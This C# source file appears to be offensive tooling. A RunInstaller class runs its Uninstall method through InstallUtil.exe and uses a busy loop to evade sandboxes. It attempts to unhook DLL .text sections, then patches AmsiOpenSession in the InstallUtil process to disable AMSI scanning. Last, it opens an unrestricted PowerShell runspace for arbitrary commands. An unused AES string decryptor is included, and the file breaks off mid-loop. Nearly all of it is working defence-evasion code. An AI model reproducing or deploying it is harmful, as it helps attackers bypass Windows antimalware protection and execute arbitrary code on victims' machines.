using System;
using System.Reflection;
using System.Reflection.Emit;
using System.Threading;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.IO;
using System.Security.Cryptography;
using System.Security.AccessControl;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Text.RegularExpressions;
using System.IO.Pipes;
using System.Resources;


namespace Prime
{
    class Program
    {
        static void Main(string[] args)
        {
        }
    }
}

[System.ComponentModel.RunInstaller(true)]
public class King : System.Configuration.Install.Installer
{


    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern IntPtr CreateFileA(
             [MarshalAs(UnmanagedType.LPStr)] string filename,
             [MarshalAs(UnmanagedType.U4)] EFileAccess access,
             [MarshalAs(UnmanagedType.U4)] EFileShare share,
             IntPtr securityAttributes,
             [MarshalAs(UnmanagedType.U4)] EFileMode creationDisposition,
             [MarshalAs(UnmanagedType.U4)] EFileAttributes flagsAndAttributes,
             IntPtr templateFile);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern IntPtr CreateFileMapping(
        IntPtr hFile,
        IntPtr lpFileMappingAttributes,
        FileMapProtection flProtect,
        uint dwMaximumSizeHigh,
        uint dwMaximumSizeLow,
        [MarshalAs(UnmanagedType.LPStr)] string lpName);


    [DllImport("kernel32.dll")]
    public static extern IntPtr MapViewOfFile(
        IntPtr hFileMappingObject,
        FileMapAccessType dwDesiredAccess,
        uint dwFileOffsetHigh,
        uint dwFileOffsetLow,
        uint dwNumberOfBytesToMap);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("psapi.dll", SetLastError = true)]
    public static extern bool GetModuleInformation(IntPtr hProcess, IntPtr hModule, out MODULEINFO lpmodinfo, uint cb);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll")]
    public static extern void CopyMemory(IntPtr destination, IntPtr source, uint length);


    delegate bool VirtualProtectDelegate(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);



    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_DOS_HEADER
    {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
        public char[] e_magic;       // Magic number
        public UInt16 e_cblp;    // Bytes on last page of file
        public UInt16 e_cp;      // Pages in file
        public UInt16 e_crlc;    // Relocations
        public UInt16 e_cparhdr;     // Size of header in paragraphs
        public UInt16 e_minalloc;    // Minimum extra paragraphs needed
        public UInt16 e_maxalloc;    // Maximum extra paragraphs needed
        public UInt16 e_ss;      // Initial (relative) SS value
        public UInt16 e_sp;      // Initial SP value
        public UInt16 e_csum;    // Checksum
        public UInt16 e_ip;      // Initial IP value
        public UInt16 e_cs;      // Initial (relative) CS value
        public UInt16 e_lfarlc;      // File address of relocation table
        public UInt16 e_ovno;    // Overlay number
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
        public UInt16[] e_res1;    // Reserved words
        public UInt16 e_oemid;       // OEM identifier (for e_oeminfo)
        public UInt16 e_oeminfo;     // OEM information; e_oemid specific
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
        public UInt16[] e_res2;    // Reserved words
        public Int32 e_lfanew;      // File address of new exe header
    }

    [StructLayout(LayoutKind.Explicit, Size = 22)]
    public struct IMAGE_NT_HEADER64
    {
        [FieldOffset(0)]
        public UInt32 Signature;
        [FieldOffset(4)]
        public IMAGE_FILE_HEADER FileHeader;
        [FieldOffset(24)]
        public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
    }

    [StructLayout(LayoutKind.Explicit)]
    public struct IMAGE_OPTIONAL_HEADER64
    {
        [FieldOffset(112)]
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
        public IMAGE_DATA_DIRECTORY[] DataDirectory;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_DATA_DIRECTORY
    {
        public UInt32 VirtualAddress;
        public UInt32 Size;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_FILE_HEADER
    {
        public UInt16 Machine;  // 4 + 12 + 4  20
        public UInt16 NumberOfSections;
        public UInt32 TimeDateStamp;
        public UInt32 PointerToSymbolTable;
        public UInt32 NumberOfSymbols;
        public UInt16 SizeOfOptionalHeader;
        public UInt16 Characteristics;
    }

    [StructLayout(LayoutKind.Explicit)]
    public struct IMAGE_SECTION_HEADER
    {
        [FieldOffset(0)]
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public char[] Name;

        [FieldOffset(8)]
        public UInt32 VirtualSize;

        [FieldOffset(12)]
        public UInt32 VirtualAddress;

        [FieldOffset(16)]
        public UInt32 SizeOfRawData;

        [FieldOffset(20)]
        public UInt32 PointerToRawData;

        [FieldOffset(24)]
        public UInt32 PointerToRelocations;

        [FieldOffset(28)]
        public UInt32 PointerToLinenumbers;

        [FieldOffset(32)]
        public UInt16 NumberOfRelocations;

        [FieldOffset(34)]
        public UInt16 NumberOfLinenumbers;

        [FieldOffset(36)]
        public DataSectionFlags Characteristics;

        public string SectionName
        {
            get { return new string(Name); }
        }
    }
    [Flags]
    public enum DataSectionFlags : uint
    {
        /// <summary>
        /// Reserved for future use.
        /// </summary>
        TypeReg = 0x00000000,
        /// <summary>
        /// Reserved for future use.
        /// </summary>
        TypeDsect = 0x00000001,
        /// <summary>
        /// Reserved for future use.
        /// </summary>
        TypeNoLoad = 0x00000002,
        /// <summary>
        /// Reserved for future use.
        /// </summary>
        TypeGroup = 0x00000004,
        /// <summary>
        /// The section should not be padded to the next boundary. This flag is obsolete and is replaced by IMAGE_SCN_ALIGN_1BYTES. This is valid only for object files.
        /// </summary>
        TypeNoPadded = 0x00000008,
        /// <summary>
        /// Reserved for future use.
        /// </summary>
        TypeCopy = 0x00000010,
        /// <summary>
        /// The section contains executable code.
        /// </summary>
        ContentCode = 0x00000020,
        /// <summary>
        /// The section contains initialized data.
        /// </summary>
        ContentInitializedData = 0x00000040,
        /// <summary>
        /// The section contains uninitialized data.
        /// </summary>
        ContentUninitializedData = 0x00000080,
        /// <summary>
        /// Reserved for future use.
        /// </summary>
        LinkOther = 0x00000100,
        /// <summary>
        /// The section contains comments or other information. The .drectve section has this type. This is valid for object files only.
        /// </summary>
        LinkInfo = 0x00000200,
        /// <summary>
        /// Reserved for future use.
        /// </summary>
        TypeOver = 0x00000400,
        /// <summary>
        /// The section will not become part of the image. This is valid only for object files.
        /// </summary>
        LinkRemove = 0x00000800,
        /// <summary>
        /// The section contains COMDAT data. For more information, see section 5.5.6, COMDAT Sections (Object Only). This is valid only for object files.
        /// </summary>
        LinkComDat = 0x00001000,
        /// <summary>
        /// Reset speculative exceptions handling bits in the TLB entries for this section.
        /// </summary>
        NoDeferSpecExceptions = 0x00004000,
        /// <summary>
        /// The section contains data referenced through the global pointer (GP).
        /// </summary>
        RelativeGP = 0x00008000,
        /// <summary>
        /// Reserved for future use.
        /// </summary>
        MemPurgeable = 0x00020000,
        /// <summary>
        /// Reserved for future use.
        /// </summary>
        Memory16Bit = 0x00020000,
        /// <summary>
        /// Reserved for future use.
        /// </summary>
        MemoryLocked = 0x00040000,
        /// <summary>
        /// Reserved for future use.
        /// </summary>
        MemoryPreload = 0x00080000,
        /// <summary>
        /// Align data on a 1-byte boundary. Valid only for object files.
        /// </summary>
        Align1Bytes = 0x00100000,
        /// <summary>
        /// Align data on a 2-byte boundary. Valid only for object files.
        /// </summary>
        Align2Bytes = 0x00200000,
        /// <summary>
        /// Align data on a 4-byte boundary. Valid only for object files.
        /// </summary>
        Align4Bytes = 0x00300000,
        /// <summary>
        /// Align data on an 8-byte boundary. Valid only for object files.
        /// </summary>
        Align8Bytes = 0x00400000,
        /// <summary>
        /// Align data on a 16-byte boundary. Valid only for object files.
        /// </summary>
        Align16Bytes = 0x00500000,
        /// <summary>
        /// Align data on a 32-byte boundary. Valid only for object files.
        /// </summary>
        Align32Bytes = 0x00600000,
        /// <summary>
        /// Align data on a 64-byte boundary. Valid only for object files.
        /// </summary>
        Align64Bytes = 0x00700000,
        /// <summary>
        /// Align data on a 128-byte boundary. Valid only for object files.
        /// </summary>
        Align128Bytes = 0x00800000,
        /// <summary>
        /// Align data on a 256-byte boundary. Valid only for object files.
        /// </summary>
        Align256Bytes = 0x00900000,
        /// <summary>
        /// Align data on a 512-byte boundary. Valid only for object files.
        /// </summary>
        Align512Bytes = 0x00A00000,
        /// <summary>
        /// Align data on a 1024-byte boundary. Valid only for object files.
        /// </summary>
        Align1024Bytes = 0x00B00000,
        /// <summary>
        /// Align data on a 2048-byte boundary. Valid only for object files.
        /// </summary>
        Align2048Bytes = 0x00C00000,
        /// <summary>
        /// Align data on a 4096-byte boundary. Valid only for object files.
        /// </summary>
        Align4096Bytes = 0x00D00000,
        /// <summary>
        /// Align data on an 8192-byte boundary. Valid only for object files.
        /// </summary>
        Align8192Bytes = 0x00E00000,
        /// <summary>
        /// The section contains extended relocations.
        /// </summary>
        LinkExtendedRelocationOverflow = 0x01000000,
        /// <summary>
        /// The section can be discarded as needed.
        /// </summary>
        MemoryDiscardable = 0x02000000,
        /// <summary>
        /// The section cannot be cached.
        /// </summary>
        MemoryNotCached = 0x04000000,
        /// <summary>
        /// The section is not pageable.
        /// </summary>
        MemoryNotPaged = 0x08000000,
        /// <summary>
        /// The section can be shared in memory.
        /// </summary>
        MemoryShared = 0x10000000,
        /// <summary>
        /// The section can be executed as code.
        /// </summary>
        MemoryExecute = 0x20000000,
        /// <summary>
        /// The section can be read.
        /// </summary>
        MemoryRead = 0x40000000,
        /// <summary>
        /// The section can be written to.
        /// </summary>
        MemoryWrite = 0x80000000
    }

    [Flags]
    public enum EFileAccess : uint
    {
        //
        // Standart Section
        //

        AccessSystemSecurity = 0x1000000,   // AccessSystemAcl access type
        MaximumAllowed = 0x2000000,     // MaximumAllowed access type

        Delete = 0x10000,
        ReadControl = 0x20000,
        WriteDAC = 0x40000,
        WriteOwner = 0x80000,
        Synchronize = 0x100000,

        StandardRightsRequired = 0xF0000,
        StandardRightsRead = ReadControl,
        StandardRightsWrite = ReadControl,
        StandardRightsExecute = ReadControl,
        StandardRightsAll = 0x1F0000,
        SpecificRightsAll = 0xFFFF,

        FILE_READ_DATA = 0x0001,        // file & pipe
        FILE_LIST_DIRECTORY = 0x0001,       // directory
        FILE_WRITE_DATA = 0x0002,       // file & pipe
        FILE_ADD_FILE = 0x0002,         // directory
        FILE_APPEND_DATA = 0x0004,      // file
        FILE_ADD_SUBDIRECTORY = 0x0004,     // directory
        FILE_CREATE_PIPE_INSTANCE = 0x0004, // named pipe
        FILE_READ_EA = 0x0008,          // file & directory
        FILE_WRITE_EA = 0x0010,         // file & directory
        FILE_EXECUTE = 0x0020,          // file
        FILE_TRAVERSE = 0x0020,         // directory
        FILE_DELETE_CHILD = 0x0040,     // directory
        FILE_READ_ATTRIBUTES = 0x0080,      // all
        FILE_WRITE_ATTRIBUTES = 0x0100,     // all

        //
        // Generic Section
        //

        GenericRead = 0x80000000,
        GenericWrite = 0x40000000,
        GenericExecute = 0x20000000,
        GenericAll = 0x10000000,

        SPECIFIC_RIGHTS_ALL = 0x00FFFF,
        FILE_ALL_ACCESS =
        StandardRightsRequired |
        Synchronize |
        0x1FF,

        FILE_GENERIC_READ =
        StandardRightsRead |
        FILE_READ_DATA |
        FILE_READ_ATTRIBUTES |
        FILE_READ_EA |
        Synchronize,

        FILE_GENERIC_WRITE =
        StandardRightsWrite |
        FILE_WRITE_DATA |
        FILE_WRITE_ATTRIBUTES |
        FILE_WRITE_EA |
        FILE_APPEND_DATA |
        Synchronize,

        FILE_GENERIC_EXECUTE =
        StandardRightsExecute |
          FILE_READ_ATTRIBUTES |
          FILE_EXECUTE |
          Synchronize
    }

    [Flags]
    public enum EFileShare : uint
    {
        /// <summary>
        /// 
        /// </summary>
        None = 0x00000000,
        /// <summary>
        /// Enables subsequent open operations on an object to request read access. 
        /// Otherwise, other processes cannot open the object if they request read access. 
        /// If this flag is not specified, but the object has been opened for read access, the function fails.
        /// </summary>
        Read = 0x00000001,
        /// <summary>
        /// Enables subsequent open operations on an object to request write access. 
        /// Otherwise, other processes cannot open the object if they request write access. 
        /// If this flag is not specified, but the object has been opened for write access, the function fails.
        /// </summary>
        Write = 0x00000002,
        /// <summary>
        /// Enables subsequent open operations on an object to request delete access. 
        /// Otherwise, other processes cannot open the object if they request delete access.
        /// If this flag is not specified, but the object has been opened for delete access, the function fails.
        /// </summary>
        Delete = 0x00000004
    }

    public enum EFileMode : uint
    {
        /// <summary>
        /// Creates a new file. The function fails if a specified file exists.
        /// </summary>
        New = 1,
        /// <summary>
        /// Creates a new file, always. 
        /// If a file exists, the function overwrites the file, clears the existing attributes, combines the specified file attributes, 
        /// and flags with FILE_ATTRIBUTE_ARCHIVE, but does not set the security descriptor that the SECURITY_ATTRIBUTES structure specifies.
        /// </summary>
        CreateAlways = 2,
        /// <summary>
        /// Opens a file. The function fails if the file does not exist. 
        /// </summary>
        OpenExisting = 3,
        /// <summary>
        /// Opens a file, always. 
        /// If a file does not exist, the function creates a file as if dwCreationDisposition is CREATE_NEW.
        /// </summary>
        OpenAlways = 4,
        /// <summary>
        /// Opens a file and truncates it so that its size is 0 (zero) bytes. The function fails if the file does not exist.
        /// The calling process must open the file with the GENERIC_WRITE access right. 
        /// </summary>
        TruncateExisting = 5
    }

    [Flags]
    public enum EFileAttributes : uint
    {
        Readonly = 0x00000001,
        Hidden = 0x00000002,
        System = 0x00000004,
        Directory = 0x00000010,
        Archive = 0x00000020,
        Device = 0x00000040,
        Normal = 0x00000080,
        Temporary = 0x00000100,
        SparseFile = 0x00000200,
        ReparsePoint = 0x00000400,
        Compressed = 0x00000800,
        Offline = 0x00001000,
        NotContentIndexed = 0x00002000,
        Encrypted = 0x00004000,
        Write_Through = 0x80000000,
        Overlapped = 0x40000000,
        NoBuffering = 0x20000000,
        RandomAccess = 0x10000000,
        SequentialScan = 0x08000000,
        DeleteOnClose = 0x04000000,
        BackupSemantics = 0x02000000,
        PosixSemantics = 0x01000000,
        OpenReparsePoint = 0x00200000,
        OpenNoRecall = 0x00100000,
        FirstPipeInstance = 0x00080000
    }

    public enum FileMapProtection : uint
    {
        PageReadonly = 0x02,
        PageReadWrite = 0x04,
        PageWriteCopy = 0x08,
        PageExecuteRead = 0x20,
        PageExecuteReadWrite = 0x40,
        SectionCommit = 0x8000000,
        SectionImage = 0x1000000,
        SectionNoCache = 0x10000000,
        SectionReserve = 0x4000000,
    }

    public enum FileMapAccessType : uint
    {
        Copy = 0x01,
        Write = 0x02,
        Read = 0x04,
        AllAccess = 0x08,
        Execute = 0x20,
    }


    [StructLayout(LayoutKind.Sequential)]
    public struct MODULEINFO
    {
        public IntPtr lpBaseOfDll;
        public uint SizeOfImage;
        public IntPtr EntryPoint;
    }


    // PInvoke declarations
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesRead);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern uint GetLastError();

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CreateFile(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateFileMapping(
        IntPtr hFile,
        IntPtr lpFileMappingAttributes,
        uint flProtect,
        uint dwMaximumSizeHigh,
        uint dwMaximumSizeLow,
        string lpName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr MapViewOfFile(
        IntPtr hFileMappingObject,
        uint dwDesiredAccess,
        uint dwFileOffsetHigh,
        uint dwFileOffsetLow,
        uint dwNumberOfBytesToMap);



    [StructLayout(LayoutKind.Sequential)]
    struct PROCESSENTRY32
    {
        public uint dwSize;
        public uint cntUsage;
        public uint th32ProcessID;
        public IntPtr th32DefaultHeapID;
        public uint th32ModuleID;
        public uint cntThreads;
        public uint th32ParentProcessID;
        public int pcPriClassBase;
        public uint dwFlags;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
        public string szExeFile;
    }

    const uint TH32CS_SNAPPROCESS = 0x00000002;
    const uint PROCESS_VM_OPERATION = 0x0008;
    const uint PROCESS_VM_READ = 0x0010;
    const uint PROCESS_VM_WRITE = 0x0020;

    static byte[] patch = { 0x48, 0x31, 0xC0 };

    public static string DS(string eT, string pph)
    {
        string ddt;
        byte[] ebyt = Convert.FromBase64String(eT);
        using (Aes aes = Aes.Create())
        {
            aes.Key = Encoding.UTF8.GetBytes(pph);
            aes.IV = new byte[16];

            using (MemoryStream ms = new MemoryStream())
            using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
            {
                cs.Write(ebyt, 0, ebyt.Length);
                cs.Close();
                ddt = Encoding.UTF8.GetString(ms.ToArray());
            }
        }
        return ddt;
    }


    public static void LoadAndCheckDlls()
    {
        string[] dlls = { "Netapi32.dll", "Advapi32.dll", "Wtsapi32.dll", "Mpr.dll", "Kernel32.dll" };

        foreach (string dll in dlls)
        {
            IntPtr handle = GetModuleHandle(dll);
            if (handle == IntPtr.Zero)
            {
                handle = LoadLibrary(dll);
                if (handle == IntPtr.Zero)
                {
                    int error = Marshal.GetLastWin32Error();
                    Console.WriteLine("Failed to load {0}. Error code: {1}", dll, error);                    
                }
                else
                {
                    Console.WriteLine("Loaded {0}", dll);
                }
            }
            else
            {
                Console.WriteLine("Already Loaded {0}", dll);
            }
        }
    }

    public static IntPtr LoadDll(string dllName)
    {
        string systemPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
        string filePath = System.IO.Path.Combine(systemPath, dllName);

        IntPtr fileHandle = CreateFile(
          filePath,
          0x80000000, // GENERIC_READ
          0x00000001, // FILE_SHARE_READ
          IntPtr.Zero,
          0x3,        // OPEN_EXISTING
          0x0,        // Default flags
          IntPtr.Zero);


        if (fileHandle == IntPtr.Zero)
        {
            Console.WriteLine("Failed to load {0}. ", dllName);
            return IntPtr.Zero;
        }

        IntPtr mappingHandle = CreateFileMapping(
            fileHandle,
            IntPtr.Zero,
            0x02,       // PAGE_READONLY
            0,
            0,
            null);

        if (mappingHandle == IntPtr.Zero)
        {
            Console.WriteLine("Failed to load map {0}. ", dllName);
            CloseHandle(fileHandle);
            return IntPtr.Zero;
        }

        IntPtr mapViewAddress = MapViewOfFile(
            mappingHandle,
            0x4,        // FILE_MAP_READ
            0,
            0,
            0);

        if (mapViewAddress == IntPtr.Zero)
        {
            Console.WriteLine("Failed to map {0}. ", dllName);
            CloseHandle(mappingHandle);
            CloseHandle(fileHandle);
            return IntPtr.Zero;
        }

        // Clean up: Close handles after the mapping has been created
        CloseHandle(mappingHandle);
        CloseHandle(fileHandle);

        return mapViewAddress;
    }

    public static IntPtr LoadNewDll(IntPtr CurrentProcess_handle, string dllName)
    {
        // Attempt to get the module handle for the specified DLL name within the context of the current process
        IntPtr Module_handle = GetModuleHandle(dllName);

        if (Module_handle == IntPtr.Zero)
        {
            Console.WriteLine("Failed to get module handle for " + dllName);
            return IntPtr.Zero; // Handle error appropriately
        }

        MODULEINFO Module_info = new MODULEINFO();

        if (!GetModuleInformation(CurrentProcess_handle, Module_handle, out Module_info, (uint)Marshal.SizeOf(typeof(MODULEINFO))))
        {
            Console.WriteLine("Failed to get module information for " + dllName);
            return IntPtr.Zero; // Handle error appropriately
        }

        return Module_info.lpBaseOfDll;
    }


    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        Console.WriteLine("Hello");
        //Console.ReadLine();
        EnumerateFolders();
    }

    static uint GetPID(string processName)
    {
        PROCESSENTRY32 pe32 = new PROCESSENTRY32();
        pe32.dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32));

        IntPtr hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot != IntPtr.Zero)
        {
            if (Process32First(hSnapshot, ref pe32))
            {
                if (!string.IsNullOrEmpty(pe32.szExeFile) && pe32.szExeFile.Equals(processName, StringComparison.OrdinalIgnoreCase))
                {
                    CloseHandle(hSnapshot);
                    return pe32.th32ProcessID;
                }

                while (Process32Next(hSnapshot, ref pe32))
                {
                    if (!string.IsNullOrEmpty(pe32.szExeFile) && pe32.szExeFile.Equals(processName, StringComparison.OrdinalIgnoreCase))
                    {
                        CloseHandle(hSnapshot);
                        return pe32.th32ProcessID;
                    }
                }
            }

            CloseHandle(hSnapshot);
        }

        return 0;
    }

    static ulong SearchPattern(byte[] startAddress, uint searchSize, byte[] pattern, uint patternSize)
    {
        uint i = 0;

        while (i < searchSize)
        {
            if (startAddress[i] == pattern[0])
            {
                uint j = 1;
                while (j < patternSize && i + j < searchSize && (pattern[j] == '?' || startAddress[i + j] == pattern[j]))
                {
                    j++;
                }
                if (j == patternSize)
                {
                    Console.WriteLine("Offset: " + (i + 3));
                    return i + 3;
                }
            }
            i++;
        }

        return 0;
    }

    public static void EnumerateFolders()
    {
        try
        {
            // Write the text file to the specified directory
            File.WriteAllText("C:/Users/EEE/Desktop/myfile.txt", "This is the text to be written to the file.");
            if (File.Exists("C:/Users/EEE/Desktop/myfile.txt"))
            {
                loopylopp();
            }
        }

        catch
        {
            string exeName = System.Diagnostics.Process.GetCurrentProcess().ProcessName;
            Console.WriteLine(exeName);
            if (exeName.Contains("InstallUtil"))
            {
                Console.WriteLine("Hello World");
                Sunny();
            }
            else
            {
                loopylopp();
            }
        }

    }


    public static void loopylopp()
    {

        for (int i = 1; i <= 100000000; i++)
        {
            // Create a function with the name "Function" + the current value of i
            string funcName = "Function" + i;

            // Create a delegate for the function
            Action<string> func = (string arg) =>
            {
                Console.WriteLine("Hello from " + funcName + "! " + arg);
                double x = 3.0;
                double y = 4.0;

                // Calculate the result of the formula
                double result = (x + y) / (x - y);
                // Print the result to the console
                Console.WriteLine(result);
            };
            // Call the function
            func(funcName);
        }
    }


    public static void Sunny()
    {
        LoadAndCheckDlls();
        //IntPtr CurrentProcess_handle = Process.GetCurrentProcess().Handle;
        uint tpid = GetPID("InstallUtil.exe");
        if (tpid == 0)
        {
            Console.WriteLine("InstallUtil.exe process not found.");
            return;
        }

        Console.WriteLine("Process PID: " + tpid);

        IntPtr CurrentProcess_handle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, false, tpid);
        if (CurrentProcess_handle == IntPtr.Zero)
        {
            Console.WriteLine("Failed to open process. Error: " + GetLastError());
            return;
        }

        string[] dlls = { "Netapi32.dll", "Advapi32.dll", "Wtsapi32.dll", "Mpr.dll", "Kernel32.dll" };

        foreach (var dll in dlls)
        {
            ProcessDll(CurrentProcess_handle, dll);
            
        }
        PatchA();


    }

    private static void ProcessDll(IntPtr processHandle, string dllName)
    {
        IntPtr HookDll_address = LoadNewDll(processHandle, dllName);

        IMAGE_DOS_HEADER IMAGE_DOS_HEADER_instance = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(
            HookDll_address,
            typeof(IMAGE_DOS_HEADER));

        IntPtr IMAGE_NT_HEADER64_address = HookDll_address + IMAGE_DOS_HEADER_instance.e_lfanew;
        IMAGE_NT_HEADER64 IMAGE_NT_HEADER64_instance = (IMAGE_NT_HEADER64)Marshal.PtrToStructure(
            IMAGE_NT_HEADER64_address,
            typeof(IMAGE_NT_HEADER64));

        IntPtr IMAGE_FILE_HEADER_address = (IntPtr)(IMAGE_NT_HEADER64_address + Marshal.SizeOf(IMAGE_NT_HEADER64_instance.Signature));
        IMAGE_FILE_HEADER IMAGE_FILE_HEADER_instance = (IMAGE_FILE_HEADER)Marshal.PtrToStructure(
            IMAGE_FILE_HEADER_address,
            typeof(IMAGE_FILE_HEADER));

        IntPtr IMAGE_SECTION_HEADER_address = (
            HookDll_address + IMAGE_DOS_HEADER_instance.e_lfanew +
            Marshal.SizeOf(typeof(IMAGE_NT_HEADER64)));

        IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER_instance = new IMAGE_SECTION_HEADER();

        for (int count = 0; count < IMAGE_FILE_HEADER_instance.NumberOfSections; count++)
        {
            IMAGE_SECTION_HEADER_instance = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(
                IMAGE_SECTION_HEADER_address + count * Marshal.SizeOf(IMAGE_SECTION_HEADER_instance),
                typeof(IMAGE_SECTION_HEADER));

            Console.WriteLine(IMAGE_SECTION_HEADER_instance.SectionName);

            if (IMAGE_SECTION_HEADER_instance.SectionName.Contains(".text"))
            {
                uint oldProtect = 0;

                IntPtr HookDllSection_address = IntPtr.Add(HookDll_address, (int)IMAGE_SECTION_HEADER_instance.VirtualAddress);
                IntPtr FleshDllSection_address = IntPtr.Add(HookDll_address, (int)IMAGE_SECTION_HEADER_instance.VirtualAddress); // This needs proper addressing

                VirtualProtect(
                    HookDllSection_address,
                    (UIntPtr)IMAGE_SECTION_HEADER_instance.VirtualSize,
                    0x40,
                    out oldProtect);

                CopyMemory(HookDllSection_address, FleshDllSection_address, IMAGE_SECTION_HEADER_instance.VirtualSize);

                VirtualProtect(
                    HookDllSection_address,
                    (UIntPtr)IMAGE_SECTION_HEADER_instance.VirtualSize,
                    oldProtect,
                    out oldProtect);

                // Optionally apply a patch or any other modification
               
            }
        }

        Console.WriteLine(IMAGE_FILE_HEADER_instance.NumberOfSections);
    }


    private static void PatchA()
    {
        byte[] pattern = { 0x48, 0x00, 0x00, 0x74, 0x00, 0x48, 0x00, 0x00, 0x74 };
        uint patternSize = (uint)pattern.Length;

        uint tpid = GetPID("InstallUtil.exe");
        if (tpid == 0)
        {
            Console.WriteLine("InstallUtil.exe process not found.");
            return;
        }

        Console.WriteLine("Process PID: " + tpid);

        IntPtr processHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, false, tpid);
        if (processHandle == IntPtr.Zero)
        {
            Console.WriteLine("Failed to open process. Error: " + GetLastError());
            return;
        }

        IntPtr moduleHandle = LoadLibrary("amsi.dll");
        if (moduleHandle == IntPtr.Zero)
        {
            Console.WriteLine("Failed to load amsi.dll. Error: " + GetLastError());
            return;
        }

        IntPtr amsiAddr = GetProcAddress(moduleHandle, "AmsiOpenSession");
        if (amsiAddr == IntPtr.Zero)
        {
            Console.WriteLine("Failed to find A function. Error: " + GetLastError());
            return;
        }

        Console.WriteLine("A address: 0x" + amsiAddr.ToString("X"));

        byte[] buffer = new byte[1024];
        uint bytesRead;

        if (!ReadProcessMemory(processHandle, amsiAddr, buffer, (uint)buffer.Length, out bytesRead))
        {
            Console.WriteLine("Failed to read process memory. Error: " + GetLastError());
            return;
        }

        ulong matchAddress = SearchPattern(buffer, bytesRead, pattern, patternSize);
        ulong updateAmsiAddress = (ulong)amsiAddr.ToInt64() + matchAddress;

        uint bytesWritten;
        if (!WriteProcessMemory(processHandle, (IntPtr)updateAmsiAddress, patch, 3, out bytesWritten))
        {
            Console.WriteLine("Failed to write process memory. Error: " + GetLastError());
            return;
        }

        Console.WriteLine("A patched.");

       CreatePowerShellProcess();



    }

    public static void CreatePowerShellProcess()
    {
        while (true) // Start an infinite loop
        {
            Console.WriteLine("Enter PowerShell Command (or type 'exit' to quit):");
            string command = Console.ReadLine();

            if (command.ToLower() == "exit") // Exit the loop if the user types 'exit'
            {
                break;
            }

            try
            {
                using (Runspace runspace = RunspaceFactory.CreateRunspace())
                {
                    runspace.Open();

                    using (PowerShell powerShell = PowerShell.Create())
                    {
                        powerShell.Runspace = runspace;

                        // Add the TLS configuration script
                        string tlsScript = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12";
                        powerShell.AddScript(tlsScript);

                        // Add the user command
                        powerShell.AddScript(command);

                        var results = powerShell.Invoke();

                        if (results.Count > 0)
                        {
                            Console.WriteLine(string.Join(Environment.NewLine, results)); // Output the result
                        }
                        else
                        {
                            Console.WriteLine("No output from command."); // If there are no results
                        }

                        // Check for any errors
                        if (powerShell.Streams.Error.Count > 0)
                        {
                            foreach (var error in powerShell.Streams.Error)
